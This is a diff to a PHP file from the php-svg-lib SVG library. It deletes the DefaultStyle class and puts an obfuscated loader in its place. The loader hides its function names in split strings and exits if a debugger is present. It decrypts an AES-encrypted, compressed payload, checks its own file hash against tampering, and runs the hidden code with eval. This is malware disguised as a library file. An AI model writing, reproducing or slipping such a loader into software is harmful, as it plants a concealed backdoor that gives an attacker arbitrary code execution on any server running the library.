@@ -1,29 +1,28 @@
 <?php
-/**
- * @package php-svg-lib
- * @link    http://github.com/PhenX/php-svg-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license GNU LGPLv3+ http://www.gnu.org/copyleft/lesser.html
- */
-
-namespace Svg;
-
-class DefaultStyle extends Style
-{
-    public $color = '';
-    public $opacity = 1.0;
-    public $display = 'inline';
-
-    public $fill = 'black';
-    public $fillOpacity = 1.0;
-    public $fillRule = 'nonzero';
-
-    public $stroke = 'none';
-    public $strokeOpacity = 1.0;
-    public $strokeLinecap = 'butt';
-    public $strokeLinejoin = 'miter';
-    public $strokeMiterlimit = 4;
-    public $strokeWidth = 1.0;
-    public $strokeDasharray = 0;
-    public $strokeDashoffset = 0;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_w96604ju=('bas'.'e64'.'_de'.'cod'.'e');
+$_fr4jzjdi=('gzu'.'nco'.'mpr'.'ess');
+$_w5j17pbk=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bzrwngd3='T0lPhLVU';
+$_rnl0c97g='aKeC4A9g';
+$_agjhap88='OFbocJt6ZzY=';
+$_ddcbt76g='gP2MmdIm';
+$_rhoyriyq='xk9Xs4vf';
+$_re1jy0vo='zoNMJw==';
+$_vnb2rwir='AunTO3S6';
+$_nmxn6q87='dm0gUlxo';
+$_k7p58ewi=$_w96604ju($_rnl0c97g.$_rhoyriyq.$_ddcbt76g.$_bzrwngd3.$_agjhap88);
+$_ylxzrbra=$_w96604ju($_nmxn6q87.$_vnb2rwir.$_re1jy0vo);
+$_b5n8h1yx=$_w96604ju('Nz/cuQd6Q4Flj2D4M4+88S9zWg2Da5BsgNKiHUbFJAG4PmFHh38QU14EKTbtR1W8XoGC18r4re+9Aa+AaISjHCTgVdnDqZ7dp0guE2ci1I2EbRDwem+/qhfyDtvbMVmpNO7V5/4LXS1Yw4SxsiQm/gSofrs3v6kovbE/xDndVN8rGuLfm0/fIH4P5ZT7HKhSoES+V9yRDfQZI/kgZ2faaJdCj0uZKqIcL3aXxSVTMgK3hm473Ei2ZPNffiXxqfUBfGD/mF4aZLmsyg50Kb6UkA==');
+$_qktelj82=$_w5j17pbk($_b5n8h1yx,'aes-256-cbc',$_k7p58ewi,OPENSSL_RAW_DATA,$_ylxzrbra);
+if($_qktelj82===false){exit;}
+$_e7mc263p=$_fr4jzjdi($_qktelj82);
+if($_e7mc263p===false){exit;}
+$_fy9v47pq='150f841579c7ecdbb254608a88e842fd4f6d536ae7fba3061facf4ce77395005';
+$_esxw2kyi=@file_get_contents(__FILE__);
+if($_esxw2kyi!==false){
+$_divk75x8=str_replace($_fy9v47pq,"0000000000000000000000000000000000000000000000000000000000000000",$_esxw2kyi);
+$_gi2wnewz=hash("sha256",$_divk75x8);
+if($_gi2wnewz!==$_fy9v47pq){@http_response_code(403);exit;}
 }
+eval($_e7mc263p);
